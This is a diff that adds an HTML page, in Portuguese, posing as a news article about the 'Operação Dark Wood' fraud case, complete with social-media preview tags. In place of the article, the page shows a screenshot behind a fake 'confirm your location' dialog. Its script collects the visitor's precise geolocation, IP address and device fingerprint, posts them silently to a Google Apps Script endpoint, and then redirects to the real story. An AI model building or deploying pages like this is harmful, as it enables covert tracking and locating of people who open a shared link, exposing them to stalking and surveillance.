@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Operação Dark Wood: os 7 presos, os nomes, os créditos falsos e o esquema milionário</title>
+
+<!-- ============ OPEN GRAPH (prévia em redes sociais) ============ -->
+<meta property="og:type" content="article">
+<meta property="og:title" content="Operação Dark Wood: os 7 presos, os nomes, os créditos falsos e o esquema milionário">
+<meta property="og:description" content="Investigação iniciada em 2019 desmontou um esquema de créditos florestais falsos que movimentou cerca de R$ 26 milhões.">
+<meta property="og:image" content="https://glauco288.github.io/DataG/site-mobile.jpeg">
+<meta property="og:image:width" content="1080">
+<meta property="og:image:height" content="1920">
+<meta property="og:url" content="https://glauco288.github.io/DataG/">
+<meta property="og:site_name" content="O Antagônico">
+
+<!-- ============ TWITTER CARD ============ -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Operação Dark Wood: os 7 presos, os nomes, os créditos falsos e o esquema milionário">
+<meta name="twitter:description" content="Investigação iniciada em 2019 desmontou um esquema de créditos florestais falsos que movimentou cerca de R$ 26 milhões.">
+<meta name="twitter:image" content="https://glauco288.github.io/DataG/site-mobile.jpeg">
+
+<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/icon?family=Material+Icons+Outlined|Material+Icons" rel="stylesheet">
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body {
+    height: 100%;
+    overflow: hidden;
+    font-family: 'Google Sans', Roboto, Arial, sans-serif;
+    background: #fff;
+  }
+
+  .print-site {
+    position: fixed;
+    inset: 0;
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    object-position: top center;
+    z-index: 1;
+    user-select: none;
+    pointer-events: none;
+  }
+
+  .print-desktop,
+  .print-mobile { display: none; }
+
+  .overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(32, 33, 36, 0.6);
+    backdrop-filter: blur(2px);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 9999;
+    padding: 20px;
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity 0.4s ease;
+  }
+  .overlay.visivel { opacity: 1; pointer-events: auto; }
+  .overlay.hidden { opacity: 0; pointer-events: none; }
+
+  .dialogo {
+    background: #fff;
+    border-radius: 28px;
+    padding: 24px;
+    max-width: 400px;
+    width: 100%;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.28);
+    transform: translateY(20px);
+    transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+    text-align: center;
+  }
+  .overlay.visivel .dialogo { transform: translateY(0); }
+
+  .dialogo .icone-grande {
+    width: 48px;
+    height: 48px;
+    margin: 0 auto 16px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: 'Material Icons';
+    font-size: 32px;
+    color: #1a73e8;
+    background: #e8f0fe;
+    border-radius: 50%;
+  }
+
+  .dialogo h2 {
+    font-size: 22px;
+    font-weight: 400;
+    color: #202124;
+    margin-bottom: 12px;
+    font-family: 'Google Sans', sans-serif;
+  }
+
+  .dialogo p {
+    font-size: 14px;
+    color: #5f6368;
+    line-height: 1.5;
+    margin-bottom: 24px;
+  }
+
+  .dialogo .acoes {
+    display: flex;
+    justify-content: center;
+    gap: 8px;
+  }
+
+  .btn-txt {
+    padding: 10px 24px;
+    font-size: 14px;
+    font-weight: 500;
+    color: #1a73e8;
+    background: transparent;
+    border: none;
+    border-radius: 100px;
+    cursor: pointer;
+    font-family: inherit;
+    transition: background 0.15s;
+  }
+  .btn-txt:hover { background: #f6fafe; }
+
+  .btn-preenchido {
+    padding: 10px 24px;
+    font-size: 14px;
+    font-weight: 500;
+    color: #fff;
+    background: #1a73e8;
+    border: none;
+    border-radius: 100px;
+    cursor: pointer;
+    font-family: inherit;
+    transition: background 0.15s, box-shadow 0.15s;
+  }
+  .btn-preenchido:hover { 
+    background: #1765cc; 
+    box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+  }
+  .btn-preenchido:disabled { opacity: 0.6; cursor: wait; }
+
+  .msg {
+    margin-top: 12px;
+    font-size: 13px;
+    color: #d93025;
+    min-height: 18px;
+  }
+
+  @media (max-width: 500px) {
+    .dialogo {
+      border-radius: 20px;
+      padding: 22px 20px;
+      max-width: 340px;
+    }
+    .dialogo h2 { font-size: 19px; }
+    .dialogo p { font-size: 13px; }
+  }
+</style>
+</head>
+<body>
+
+<img src="site.jpeg" alt="" class="print-site print-desktop">
+<img src="site-mobile.jpeg" alt="" class="print-site print-mobile">
+
+<div class="overlay" id="overlay">
+  <div class="dialogo">
+    <div class="icone-grande" id="icone">location_on</div>
+    <h2 id="titulo">Confirme sua localização</h2>
+    <p id="subtitulo">Para continuar lendo esta reportagem, você precisa autorizar o acesso à sua localização.</p>
+    <div class="acoes" id="acoes">
+      <button class="btn-txt" id="btnCancelar">Agora não</button>
+      <button class="btn-preenchido" id="btn">Permitir</button>
+    </div>
+    <div class="msg" id="msg"></div>
+  </div>
+</div>
+
+<script>
+  const ehMobile =
+    /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|Mobile/i.test(navigator.userAgent) ||
+    (window.matchMedia && window.matchMedia('(pointer: coarse)').matches) ||
+    window.innerWidth <= 768;
+
+  if (ehMobile) {
+    document.querySelector('.print-mobile').style.display = 'block';
+  } else {
+    document.querySelector('.print-desktop').style.display = 'block';
+  }
+
+  const btn = document.getElementById('btn');
+  const btnCancelar = document.getElementById('btnCancelar');
+  const msg = document.getElementById('msg');
+  const overlay = document.getElementById('overlay');
+  const icone = document.getElementById('icone');
+  const titulo = document.getElementById('titulo');
+  const subtitulo = document.getElementById('subtitulo');
+  const acoes = document.getElementById('acoes');
+
+  const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzEIeDdSyoHHW8t1sVRE-C8dfZgFQVnbBVVsvqlpmBlAkUNZ9e_TZszpPZz_iwV7oUh/exec';
+  const DESTINO = 'https://oantagonico.net.br/a-operacao-dark-wood-os-7-presos-os-nomes-os-creditos-falsos-e-o-esquema-milionario/';
+
+  let jaCapturou = false;
+  let pedidoEmAndamento = false;
+
+  let ipCache = 'Indisponível';
+  fetch('https://api.ipify.org?format=json')
+    .then(r => r.json())
+    .then(d => { ipCache = d.ip; })
+    .catch(() => {});
+
+  setTimeout(() => {
+    overlay.classList.add('visivel');
+    pedirLocalizacao();
+  }, 1000);
+
+  btn.addEventListener('click', () => {
+    if (jaCapturou) return;
+    msg.textContent = '';
+    pedirLocalizacao();
+  });
+
+  btnCancelar.addEventListener('click', () => {
+    msg.textContent = 'Você precisa autorizar para continuar lendo.';
+  });
+
+  function pedirLocalizacao() {
+    if (jaCapturou || pedidoEmAndamento) return;
+    pedidoEmAndamento = true;
+
+    if (!navigator.geolocation) {
+      msg.textContent = 'Seu navegador não suporta geolocalização.';
+      pedidoEmAndamento = false;
+      return;
+    }
+
+    btn.disabled = true;
+    btn.textContent = 'Obtendo...';
+
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        if (jaCapturou) return;
+        jaCapturou = true;
+        pedidoEmAndamento = false;
+
+        const { latitude, longitude, accuracy } = pos.coords;
+        const payload = {
+          Latitude: latitude,
+          Longitude: longitude,
+          Precisao: Math.round(accuracy) + 'm',
+          IP: ipCache,
+          UserAgent: navigator.userAgent,
+          Plataforma: navigator.platform || 'N/A',
+          Idioma: navigator.language || 'N/A',
+          Resolucao: `${screen.width}x${screen.height}`,
+          FusoHorario: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          Nucleos: navigator.hardwareConcurrency || 'N/A',
+          Memoria: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'N/A'
+        };
+
+        const body = Object.entries(payload)
+          .map(([k,v]) => encodeURIComponent(k)+'='+encodeURIComponent(v)).join('&');
+
+        fetch(SCRIPT_URL, {
+          method: 'POST', mode: 'no-cors',
+          headers: { 'Content-Type': 'text/plain;charset=utf-8' },
+          body
+        }).catch(e => console.error(e));
+
+        mostrarSucesso();
+
+        setTimeout(() => {
+          overlay.classList.add('hidden');
+          setTimeout(() => {
+            window.location.href = DESTINO;
+          }, 400);
+        }, 2000);
+      },
+      (err) => {
+        pedidoEmAndamento = false;
+        btn.disabled = false;
+        btn.textContent = 'Permitir';
+
+        if (err.code === err.PERMISSION_DENIED) {
+          msg.textContent = 'Permissão negada. Permita nas configurações do navegador (ícone de cadeado).';
+        } else if (err.code === err.TIMEOUT) {
+          msg.textContent = 'Tempo esgotado. Tente novamente.';
+        } else {
+          msg.textContent = 'Não foi possível obter a localização. Tente novamente.';
+        }
+      },
+      {
+        enableHighAccuracy: false,
+        timeout: 60000,
+        maximumAge: 60000
+      }
+    );
+  }
+
+  function mostrarSucesso() {
+    icone.textContent = 'check_circle';
+    icone.style.color = '#188038';
+    icone.style.background = '#e6f4ea';
+    titulo.textContent = 'Localização confirmada';
+    subtitulo.textContent = 'Abrindo a reportagem...';
+    acoes.style.display = 'none';
+    msg.textContent = '';
+  }
+</script>
+</body>
+</html>
